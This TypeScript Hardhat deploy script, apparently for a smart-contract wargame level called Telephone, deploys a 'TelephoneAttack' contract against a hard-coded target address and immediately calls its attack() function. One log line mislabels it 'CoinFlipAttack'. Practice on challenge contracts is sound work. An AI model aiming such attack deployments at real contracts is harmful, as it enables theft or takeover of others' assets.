import { HardhatRuntimeEnvironment } from 'hardhat/types';
import { DeployFunction } from 'hardhat-deploy/types';
import { ethers } from 'hardhat';
// import { FileService } from "../utils";
import { TelephoneAttack__factory } from '../../typechain-types';

const func: DeployFunction = async function (hre: HardhatRuntimeEnvironment){
    const telephoneAddress = "0xD6fDe6812029B5e87e2969D0f0BCD0ab920f68BA"

    console.log(">> Deploying CoinFlipAttack contract");
    const TelephoneAttack = (await ethers.getContractFactory(
        "TelephoneAttack",
        (await ethers.getSigners())[0])) as TelephoneAttack__factory;
    const telephoneAttack = await TelephoneAttack.deploy(telephoneAddress);
    await telephoneAttack.deployed();
    console.log(`>> Deployed at ${telephoneAttack.address}`);
    console.log("✅ Done");
    await telephoneAttack.attack();
    console.log("✅ SUCCESS");
}
export default func;
func.tags = ['TelephoneAttack'];